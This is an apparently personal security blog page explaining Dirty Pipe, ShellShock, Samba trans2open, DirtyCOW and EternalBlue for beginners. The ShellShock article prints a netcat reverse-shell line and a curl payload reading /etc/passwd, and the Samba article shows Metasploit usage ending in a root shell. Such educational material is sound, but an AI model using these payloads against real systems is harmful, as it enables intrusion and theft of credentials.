<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="height=device-height, width=device-width, initial-scale=1.0, minimum-scale=1.0">
    <meta name="generator" content="Hugo 0.108.0">
    <meta name="generator" content="Relearn 5.9.4+tip">
    <meta name="robots" content="noindex, nofollow, noarchive, noimageindex">
    <meta name="description" content="Exploit writeups, info sec articles..">
    <meta name="author" content="solc0nf">
    <title>Exploit Articles :: solc0nf</title>
    <!-- https://github.com/filamentgroup/loadCSS/blob/master/README.md#how-to-use -->
    <link href="/css/fontawesome-all.min.css?1690802202" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fontawesome-all.min.css?1690802202" rel="stylesheet"></noscript>
    <link href="/css/featherlight.min.css?1690802202" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/featherlight.min.css?1690802202" rel="stylesheet"></noscript>
    <link href="/css/auto-complete.css?1690802202" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/auto-complete.css?1690802202" rel="stylesheet"></noscript>
    <link href="/css/perfect-scrollbar.min.css?1690802202" rel="stylesheet">
    <link href="/css/nucleus.css?1690802202" rel="stylesheet">
    <link href="/css/fonts.css?1690802202" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fonts.css?1690802202" rel="stylesheet"></noscript>
    <link href="/css/theme.css?1690802202" rel="stylesheet">
    <link href="/css/theme-relearn-dark.css?1690802202" rel="stylesheet" id="variant-style">
    <link href="/css/ie.css?1690802202" rel="stylesheet">
    <link href="/css/variant.css?1690802202" rel="stylesheet">
    <link href="/css/print.css?1690802202" rel="stylesheet" media="print">
    <link href="/css/format-print.css?1690802202" rel="stylesheet">
    <script src="/js/url.js?1690802202"></script>
    <script src="/js/variant.js?1690802202"></script>
    <script>
      // hack to let hugo tell us how to get to the root when using relativeURLs, it needs to be called *url= for it to do its magic:
      // https://github.com/gohugoio/hugo/blob/145b3fcce35fbac25c7033c91c1b7ae6d1179da8/transform/urlreplacers/absurlreplacer.go#L72
      window.index_js_url="/index.search.js";
      var root_url="/";
      var baseUri=root_url.replace(/\/$/, '');
      // translations
      window.T_Copy_to_clipboard = 'Copy to clipboard';
      window.T_Copied_to_clipboard = 'Copied to clipboard!';
      window.T_Copy_link_to_clipboard = 'Copy link to clipboard';
      window.T_Link_copied_to_clipboard = 'Copied link to clipboard!';
      window.T_No_results_found = 'No results found for \u0022{0}\u0022';
      window.T_N_results_found = '{1} results found for \u0022{0}\u0022';
      // some further base stuff
      var baseUriFull='https:\/\/solc0nf.github.io/';
      window.variants && variants.init( [ 'relearn-dark' ] );
    </script>
    <script src="/js/jquery.min.js?1690802202" defer></script>
  </head>
  <body class="mobile-support print disableInlineCopyToClipboard" data-url="/exploit-articles/index.html">
    <div id="body" class="default-animation">
      <div id="sidebar-overlay"></div>
      <div id="toc-overlay"></div>
      <nav id="topbar" class="highlightable" dir="ltr">
        <div>
          <div id="breadcrumbs">
            <span id="sidebar-toggle-span">
              <a href="#" id="sidebar-toggle" title='Menu (CTRL+ALT+n)'><i class="fas fa-bars fa-fw"></i></a>
            </span>
            <ol class="links" itemscope itemtype="http://schema.org/BreadcrumbList">
              <li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement"><a itemprop="item" href="/index.html"><span itemprop="name">solc0nf</span></a><meta itemprop="position" content="1"> > </li>
              <li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement"><span itemprop="name">Exploit Articles</span><meta itemprop="position" content="2"></li>
            </ol>
          </div>
        </div>
      </nav>
      <main id="body-inner" class="highlightable chapter narrow" tabindex="-1">
        <div class="flex-block-wrapper">
          <div id="head-tags">
          </div>
          <article class="chapter">
<div class="article-subheading">Chapter 1</div>
<h1 id="exploit-articles">Exploit Articles</h1>

<figure><img src="/images/feather_logo.png" width="200px" height="200px"/>
</figure>

<p>Articles about common exploits affecting Windows and Linux system.</p>
<p><em>Information contained in these articles have been sourced from various sites during the course of my
studies. I have tried to construct the articles in such a way that it would be easy for beginners in the field (Infosec, or Information Security) to understand. The material provided here is intended solely for educational purposes only. I intend no copyright infringement of any kind. List of sites I have collated the material from, will be mentioned wherever possible. The reader accepts full responsibility for the use of the information provided. While every attempt has been made to ensure that the information contained in these articles has been obtained from reliable sources, I am not responsible for any errors or omissions, or for the results obtained from the use of this information.</em></p>
<p>It is an unsafe and rather risky practice to copy any script from the internet and paste it into your terminal without knowing what the script really does. Read the script carefully and always use virtual machines to practice your hacking skills. <em>Do not attack machines unless you have explicit written permission to do so</em>. Take periodic snapshots of your virtual machines so that you don&rsquo;t have to rebuild one from scratch if something goes wrong during the course of your learning.</p>
<p>We are here to make our computers and networks safe from threats. Understand your responsibilities, please.</p>

            <footer class="footline">
            </footer>
          </article>

          <section>
            <h1 class="a11y-only">Subsections of Exploit Articles</h1>
          <article class="default">
<h1 id="dirty-pipe">Dirty Pipe</h1>

<table>
<thead>
<tr>
<th>Vulnerability</th>
<th>Affected OS</th>
<th>CVE</th>
<th>CVSS Score</th>
<th>Disclosure Date</th>
</tr>
</thead>
<tbody>
<tr>
<td>Dirty Pipe</td>
<td>Linux (kernel versions 5.8 and newer)</td>
<td>CVE-2022-0847</td>
<td>7.8 (high)</td>
<td>March 7 2022</td>
</tr>
</tbody>
</table>
<p>This exploit was disclosed by Max Kellermann.</p>
<p>DirtyPipe is a local privilege escalation vulnerability, which allows a user to bypass file permission restrictions and write arbitrary data to any file, provided certain conditions are met, the primary one being that the user has to have read permissions to the file.</p>
<p>In order to understand this vulnerability, we need to understand the following concepts:</p>
<ul>
<li>pipe</li>
<li>page</li>
<li>splice()</li>
</ul>
<p><em>Pipe</em>: A pipe is a communication method between two or more processes in which the output of one process can be used as the input for the other. An example of a pipe is <code>ls -la | grep Documents</code>. In this example, the output of the ls command (which is a listing of files and directories) is <em>piped</em> into the <code>grep</code> command which in turn, looks for the string <code>Documents</code> in that input and displays the results on screen. Pipes are unidirectional, with a read end and a write end.</p>
<p><em>Page</em>: Memory management in Linux makes use of pages. Whether it is to read from a file on the secondary memory (like the hard drive) or to write to it, pages are used. Memory pages are 4Â KB in size. Whenever data is read from the secondary memory, it is put into the page cache. Likewise, when data is to be written to the disk, it is placed in the page cache and eventually written to the disk. This setup eliminates the need to expensive read-write operations to the disk. Since main memory is way faster than secondary memory, this scheme helps performance. One point that is of relevance when talking about this vulnerability is the <em>PIPE_BUF_FLAG_CAN_MERGE</em> flag, which indicates whether merging more data into the pipe is allowed or not.</p>
<p><em>splice()</em>: is a system call (a system call is a way through which a process requests a service from the operating system) which moves data between a file descriptor and a pipe, without copying between kernel address space and user address space. The pipe doesn&rsquo;t actually contain the data itself, but a reference to the location of the page cache in memory, where the data is stored.</p>
<p>The way this vulnerability is exploited is as follows:</p>
<ul>
<li>Read the target file. This will cause the file to be placed in the page cache.</li>
<li>Create a pipe in a special way so that the PIPE_BUF_FLAG_CAN_MERGE is set.</li>
<li>Use the splice() system call to make the pipe point to the locations of the page cache where the data is cached.</li>
<li>Write arbitrary data into the pipe. The data so written will overwrite the cached page file and since the PIPE_BUF_FLAG_CAN_MERGE is set, it overwrites the file on the disk.</li>
</ul>
<p>Exploit code available on <a href="https://www.exploit-db.com/exploits/50808" target="_blank">exploit-db.com</a></p>
<p>The blog post by Max Kellermann about this exploit linked <a href="https://dirtypipe.cm4all.com/" target="_blank">here</a> is a fascinating read.</p>

            <footer class="footline">
            </footer>
          </article>

          <article class="default">
<h1 id="shellshock">ShellShock</h1>

<figure><img src="/images/bash.png" height="100px"/>
</figure>

<p>ShellShock is a vulnerability in the Bash shell (GNU Bash upto version 4.3) that allows Bash to execute unintentional commands from environment variables. Attackers can issue commands remotely on the target host with elevated privileges, resulting in complete takeover of the system.</p>
<p><em>Let us have a look at what environment variables are</em>.</p>
<p>Environment variables are the variables specific to a certain environment, like a root user would have different environment variables than a normal user in a Linux system.</p>
<p>The <code>env</code> command prints out a list of all the environment variables for your login on to the screen. Some examples of environment variables are <em>USER</em>, <em>HOME</em>, <em>SHELL</em>, <em>LANG</em> etc. You can set an environment variable with <code>export VARIABLE_NAME=variable_value</code>. One point to note is that environment variables declared in this manner are valid only for the current bash session. In order to persist environment variables, you can define them in your <code>.bashrc</code> file. You could also print out specific env variables with the <code>echo</code> command, like <code>echo $HOME</code>.</p>
<hr>
<p>ShellShock vulnerability is particularly dangerous due to the fact that a wide array of IoT <em>smart devices</em> like routers, webcams, home security systems etc. could potentially be targets to attacks. Applications like web and mail servers, DNS servers use bash to communicate with the underlying operating system, rendering them susceptible to attacks. ShellShock could also be used to launch DoS attacks on vulnerable servers.</p>
<p>Now, for details on how this vulnerability affects systems.</p>
<p>Bash scripting language supports functions, that contain pieces of code that can be reused. We can also store the functions so defined, in environment variables, which would let bash scripts export functions as environment variables and allow a sub-shell to use them. Let us break it down a bit.</p>
<p>You can define bash functions with the syntax <code>greeting=() { echo &quot;Hi dawns33ker&quot;; }</code> The vulnerability arises from how bash implemented importing functions stored in environment variables. Whenever a new shell is created, bash looks through the environment variables for functions and imports all the defined functions. This is done by simply removing the <code>=</code> and evaluating the result.</p>
<p>For example, the greetings function above would become <code>greeting() { echo &quot;Hi dawns33ker&quot;};</code> Due to ShellShock, it is possible to exploit this behaviour by adding extra code to the end of the function definition.</p>
<p>Let us take the case of a function being defined as an environment variable. <code>env X='() { :; }; echo &quot;bash vulnerable&quot;' bash -c :</code>. This is a function which will determine if your version of bash is vulnerable to ShellShock. If vulnerable, the function will print the message <em>bash vulnerable</em> or else it prints nothing.</p>
<p>This function assignment consists of two commands. The first part is assigning the value <code>X='() { :; }; echo &quot;bash vulnerable&quot;'</code> to X. The value assigned to X is designed to exploit the ShellShock vulnerability, i.e chaining a command to the function definition, in this case the <code>echo</code> command. The second part i.e <code>bash -c</code> invokes a new bash shell with the command <code>:</code> which does nothing. That is to say that the first part of the payload <code>() { :;}</code>is a function that does nothing. The second part <code>echo &quot;bash vulnerable&quot;</code> which has been chained to the function definition is the malicious payload that will be executed when the function is imported.</p>
<p>As explained above, when the function is imported, the <code>=</code> is removed and the line <code>X='() { :; }; echo &quot;bash vulnerable&quot;</code> is passed to the bash interpreter. The <code>;</code> is being a command separator, the definition of the <code>X</code> function and the malicious payload both are executed. The <code>echo</code> command would obviously be replaced by something more menacing, like spawning a reverse shell on the attacker PC, like, <code>nc 10.10.11.1 4455 -e /bin/bash &amp;' bash -c :</code>. This example works by using netcat to open a bash session and redirect input and output to the attacker&rsquo;s machine. The <code>&amp;</code> operator means that the session is opened in the background and now the attacker has a shell on the vulnerable system.</p>
<p>ShellShock can be exploited by using HTTP requests to a vulnerable server. An attacker could craft a request like <code>() { :; }; echo &quot;PASSWD:&quot; $(&lt;/etc/passwd)</code> and send the request to the server with <code>curl -H &quot;User-Agent: () { :; }; echo &quot;PASSWD:&quot; $(&lt;/etc/passwd)&quot; http://example.com/</code></p>
<hr>
<p>References:</p>
<p><a href="https://github.com/jeholliday/shellshock" target="_blank">GitHub</a></p>
<p><a href="https://blog.cloudflare.com/inside-shellshock/" target="_blank">Cloudflare Blogs</a></p>
<p>Exploit Code:</p>
<p><a href="https://www.exploit-db.com/exploits/34900" target="_blank">Apache mod_cgi - &lsquo;Shellshock&rsquo; Remote Command Injection</a></p>
<p><a href="https://www.exploit-db.com/exploits/36933" target="_blank">dhclient 4.1 - Bash Environment Variable Command Injection (Shellshock)</a></p>
<p><a href="https://www.exploit-db.com/exploits/34766" target="_blank">Bash - &lsquo;Shellshock&rsquo; Environment Variables Command Injection</a></p>

            <footer class="footline">
            </footer>
          </article>

          <article class="default">
<h1 id="samba-trans2open-exploit">Samba Trans2open Exploit</h1>

<p><strong>A little about Samba</strong>.</p>
<p>Samba is the standard Windows interoperabiity suite of programs for Linux and Unix. The Samba package provides secure, stable and fast file and print services for all clients such as OS/2, Linux, FreeBSD, using the SMB/CIFS protocol.</p>
<p>Samba is an important component to seamlessly integrate Linux servers and desktops into a Windows Active Directory environment. It can function both as a domain controller or as a regular domain member.</p>
<p>In Samba <em>versions 2.2.0 to 2.2.8a</em>, running on <em>x86 Linux systems</em> that do not have the <em>noexec stack option set</em>, there exists a buffer overflow vulnerability which could lead to remote administrative privilege compromise. This vulnerability could allow a remote attacker to execute arbitrary code on the affected system. The stack overflow error is believed to be in the trans2open() function call.</p>
<p>There are at least 3 variants of the trans2open exploit, one written in C and two written in the Perl scripting language.</p>
<p><strong>Samba trans2open Overflow (Linux x86) - Metasploit</strong></p>
<p>There are four metasploit exploit modules, as shown in the screenshot below:</p>
<p>
<a href="/images/metasploit_trans2open_modules.png" data-featherlight="image">
<img src="/images/metasploit_trans2open_modules.png" alt="Metasploit trans2_open" style="height: auto; width: auto;" loading="lazy">
</a></p>
<p>Basic usage:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>msf6 &gt; use exploit/linux/samba/trans2open
</span></span><span style="display:flex;"><span>[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
</span></span><span style="display:flex;"><span>msf6 exploit(linux/samba/trans2open) &gt; options
</span></span><span style="display:flex;"><span>Module options (exploit/linux/samba/trans2open):
</span></span><span style="display:flex;"><span>   Name    Current Setting  Required  Description
</span></span><span style="display:flex;"><span>   ----    ---------------  --------  -----------
</span></span><span style="display:flex;"><span>   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/us
</span></span><span style="display:flex;"><span>                                      ing-metasploit.html
</span></span><span style="display:flex;"><span>   RPORT   139              yes       The target port (TCP)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Payload options (linux/x86/meterpreter/reverse_tcp):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   Name   Current Setting  Required  Description
</span></span><span style="display:flex;"><span>   ----   ---------------  --------  -----------
</span></span><span style="display:flex;"><span>   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
</span></span><span style="display:flex;"><span>   LPORT  4444             yes       The listen port
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Exploit target:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   Id  Name
</span></span><span style="display:flex;"><span>   --  ----
</span></span><span style="display:flex;"><span>   0   Samba 2.2.x - Bruteforce
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>View the full module info with the info, or info -d command.
</span></span></code></pre></div><p>We need to set the following options before running the exploit</p>
<ul>
<li>RHOSTS â IP Address of the target Linux server</li>
<li>LHOST â IP Address of the attacker machine</li>
<li>Set the payload with <code>set payload linux/x86/shell_reverse_tcp</code></li>
</ul>
<p>Once both these options are set, execute the exploit by typing <strong>run</strong> or <strong>exploit</strong>.</p>
<p>Metasploit will run the exploit, and you will get root privileges on the target machine.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[*] Started reverse TCP handler on 192.168.56.11:4444 
</span></span><span style="display:flex;"><span>[*] 192.168.56.110:139 - Trying return address 0xbffffdfc...
</span></span><span style="display:flex;"><span>[*] 192.168.56.110:139 - Trying return address 0xbffffcfc...
</span></span><span style="display:flex;"><span>[*] 192.168.56.110:139 - Trying return address 0xbffffbfc...
</span></span><span style="display:flex;"><span>[*] 192.168.56.110:139 - Trying return address 0xbffffafc...
</span></span><span style="display:flex;"><span>[*] 192.168.56.110:139 - Trying return address 0xbffff9fc...
</span></span><span style="display:flex;"><span>[*] 192.168.56.110:139 - Trying return address 0xbffff8fc...
</span></span><span style="display:flex;"><span>[*] 192.168.56.110:139 - Trying return address 0xbffff7fc...
</span></span><span style="display:flex;"><span>[*] 192.168.56.110:139 - Trying return address 0xbffff6fc...
</span></span><span style="display:flex;"><span>[*] Command shell session 1 opened (192.168.56.11:4444 -&gt; 192.168.56.110:32773) at 2022-05-24 19:34:58 +0400
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[*] Command shell session 2 opened (192.168.56.11:4444 -&gt; 192.168.56.110:32774) at 2022-05-24 19:34:59 +0400
</span></span><span style="display:flex;"><span>[*] Command shell session 3 opened (192.168.56.11:4444 -&gt; 192.168.56.110:32775) at 2022-05-24 19:35:01 +0400
</span></span><span style="display:flex;"><span>[*] Command shell session 4 opened (192.168.56.11:4444 -&gt; 192.168.56.110:32776) at 2022-05-24 19:35:02 +0400
</span></span><span style="display:flex;"><span>id
</span></span><span style="display:flex;"><span>uid=0(root) gid=0(root) groups=99(nobody)
</span></span></code></pre></div><p><em>Reference Links:</em></p>
<p><em><a href="https://www.exploit-db.com/" target="_blank">exploit-db.com</a></em></p>
<p><em><a href="https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/linux/samba/trans2open" target="_blank">infosecmatter.com</a></em></p>
<p><em><a href="https://www.samba.org/" target="_blank">samba.org</a></em></p>
<p><em><a href="https://www.metasploit.com/" target="_blank">metasploit.com</a></em></p>

            <footer class="footline">
            </footer>
          </article>

          <article class="default">
<h1 id="the-dirtycow-exploit">The Dirtycow Exploit</h1>

<h3 id="dirtycow-cve-2016-5195">DirtyCOW (CVE-2016-5195)</h3>
<p>The DirtyCOW is a vulnerability in the Linux kernel which allowed processes, write access to read only memory mappings. This vulnerability was discovered by Phil Oester.</p>
<p>The vulnerability is called DirtyCOW because the issue is caused by a <em>race condition</em> <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup> in the way the kernel handles <em>copy-on-write (COW)</em> COW is an optimization strategy used by operating systems. When multiple processes ask for resources, the system can give them pointers to the same resource. This state can be maintained until a program tries to modify its <em>copy</em> of the resource. When processes try to do this, a <em>private copy</em> of the resource is created so that other processes cannot read that data. The Linux kernel&rsquo;s COW implementation had a flaw which causes a race condition, allowing non-privileged users to alter root owned files. This flaw, effectively gives unprivileged local users write access to otherwise ready only memory mappings and thus elevate their privileges on the affected system.</p>
<p>The <em>dirty</em> part of the name comes from the <strong>Dirty Bit</strong>. A dirty bit or modified bit is a bit that is associated with a block of memory and indicates whether the corresponding block of memory has been modified. The dirty bit is set when the processor writes to (modifies) this memory. The dirty bit indicates that its associated block of memory has been modified and not saved to storage yet.</p>
<p>When a block of memory is to be replaced, its corresponding dirty bit is checked to see if the block needs to be written back to secondary memory before being replaced, or it can simply be removed. Dirty bits are used by CPU cache and page replacement algorithms of operating systems.</p>
<p>While most mainstream systems have been patched, there are several other Linux based embedded devices like access control devices, biometric scanners and employee attendance recording devices that are still vulnerable. Since these devices may not receive security updates, DirtyCOW still is an attack vector where such devices are used. The real risk of the vulnerability is when user level access and code execution ability, exists on the device.</p>
<p>The vulnerability was patched in Linux kernel versions 4.8.3, 4.7.9, 4.4.26 and newer. The first patch released in 2016 did not fully address remediation of the issue and a revised patch was released in November 2017, before public disclosure of the vulnerability.</p>
<p>Exploit code for this vulnerability is available on <a href="https://www.exploit-db.com/exploits/40839" target="_blank">https://www.exploit-db.com/exploits/40839</a>. You might have come across and probably ran this exploit while working <strong><a href="https://vulnhub.com" target="_blank">vulnhub</a></strong> machines.</p>
<p>A POC exploit is available on <a href="https://github.com/firefart/dirtycow" target="_blank">GitHub</a>. This exploit script needs to be compiled and run on the affected system in order for it to work.</p>
<p>A detection/scanner script for this vulnerability is available on <a href="https://access.redhat.com/sites/default/files/rh-cve-2016-5195_1.sh" target="_blank">https://access.redhat.com/sites/default/files/rh-cve-2016-5195_1.sh</a>.</p>
<h3 id="android-devices">Android devices</h3>
<p><strong>ZINU</strong> is the first malware for Android devices, which exploit the DirtyCOW vulnerability. It can be used to root any devices upto Android 7.0 Nougat. According to a report from security vendor TrendMicro, over 300,000 malicious apps carrying ZINU were reported in the wild, as of September 2017. Once the user launches an infected app, ZINU connects to its C&amp;C server, then uses the DirtyCOW exploit to gain root privileges to the device. While the exploit cannot be executed remotely, malicious apps can still plant backdoors and execute remote control attacks.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://www.secpod.com/blog/dirty-cow-vulnerability/" target="_blank">https://www.secpod.com/blog/dirty-cow-vulnerability/</a></li>
<li>A YouTube video explaining the exploit is <a href="https://www.youtube.com/watch?v=kEsshExn7aE" target="_blank">here</a>.</li>
<li><a href="https://www.makeuseof.com/tag/dirty-cow-vulnerability-everything-know/" target="_blank">https://www.makeuseof.com/tag/dirty-cow-vulnerability-everything-know/</a></li>
</ul>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p>A race condition occurs when two or more threads can access shared data and they try to change it at the same time. Because the thread scheduling algorithm can swap between threads at any time, you don&rsquo;t know the order in which the threads will attempt to access the shared data. Therefore, the result of the change in data is dependent on the thread scheduling algorithm, i.e. both threads are <strong>&ldquo;racing&rdquo;</strong> to access/change the data.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>

            <footer class="footline">
            </footer>
          </article>

          <article class="default">
<h1 id="eternal-blue">Eternal Blue</h1>

<figure><img src="/images/EternalBlue.png" height="300px"/>
</figure>

<p><strong>EternalBlue</strong> is the name given to a series of Microsoft software vulnerabilities, as well as an exploit developed by the Unites State&rsquo;s NSA, as a cyber attack tool. Although the EternalBlue exploit affects only Windows operating systems, anything that uses the SMBv1 file sharing protocol is vulnerable to attack, such as <em>Siemens ultrasound medical equipment</em>.</p>
<p>EternalBlue was developed the NSA as a part of their controversial program of stockpiling and weaponizing cybersecurity vulnerabilities, rather that flagging those to the appropriate vendor for remediation. The NSA used EternalBlue for 5 years, before alerting Microsoft of its existence. This was probable due to the fact that a group of hackers called <strong>The Shadow Brokers</strong> hacked the NSA and released their cyber weaponry to the wild. EternalBlue was released as the fifth is a series, the title of the release being <strong>Lost in Translation</strong>. This was done via a link on their Twitter account, on April 14, 2017.</p>
<figure><img src="/images/EternalBlue-1.png"/>
</figure>

<blockquote>
<p>Before it leaked, EternalBlue was one of the most useful exploits in the NSA&rsquo;s arsenal, used in countless intelligence gathering and counter-terrorism operations. - The New York Times.</p>
</blockquote>
<p>In short, the NSA discovers the EternalBlue vulnerability and develops an exploit which then was used for their operations for a period of 5 years. Then, they get hacked by The Shadow Brokers, leaving the NSA with no other option than to inform Microsoft if its existence. Microsoft in turn, released the patch <strong>MS17-010</strong>. This patch was designed to fix the EternalBlue vulnerability in all versions of Windows including Windows Vista, Windows 8.1, Windows 10, Windows Server 2008, Windows Server 2021 and Windows Server 2016.</p>
<p>Due to the severity of the vulnerability and the sheer number of devices out there, Microsoft also released patched for unsupported versions of Windows like XP and Server 2003.</p>
<h2 id="how-the-exploit-works">How the exploit works.</h2>
<figure><img src="/images/EternalBlue-2.png"/>
</figure>

<p>The exploit works by taking advantage of the vulnerabilities present in <strong>SMBv1 protocol</strong> in older versions of Windows. SMBv1 was first developed in 1983 as a network communication protocol to enable shared access to file and printers (among others).
The exploit makes use of the way Windows handles (or mishandles) specially crafted packets from malicious attackers. Once the attacker send a specially crafted packet to the target server, he could potentially get elevated privileges to the target server. From the target, the attacker could then, potentially move laterally across the network, further compromising other machines.</p>
<p>The EternalBlue vulnerability has been famously used to spread the WannaCry, Petya and NotPetya ransomware. The WannaCry cyber attack began on May 2017, spreading at the rate of 16,000 devices per hour, infecting over 230,000 Windows computers across 150 countries in a single day.</p>
<p>Almost a million computers still use the vulnerable SMBv1 protocol and remain online. As long as these machines remain unpatched, EternalBlue truly will remain <strong>ETERNAL</strong>.</p>
<p>Resource Links:</p>
<ul>
<li><a href="https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010" target="_blank">Microsoft Security Bulletin MS17-010 - Critical</a></li>
<li><a href="https://www.avast.com/c-eternalblue" target="_blank">What Is EternalBlue and Why Is the MS17-010 Exploit Still Relevant?</a></li>
</ul>

            <footer class="footline">
            </footer>
          </article>

          </section>        </div>
      </main>
    </div>
    <script src="/js/clipboard.min.js?1690802202" defer></script>
    <script src="/js/perfect-scrollbar.min.js?1690802202" defer></script>
    <script src="/js/featherlight.min.js?1690802202" defer></script>
    <script src="/js/theme.js?1690802202" defer></script>
  </body>
</html>
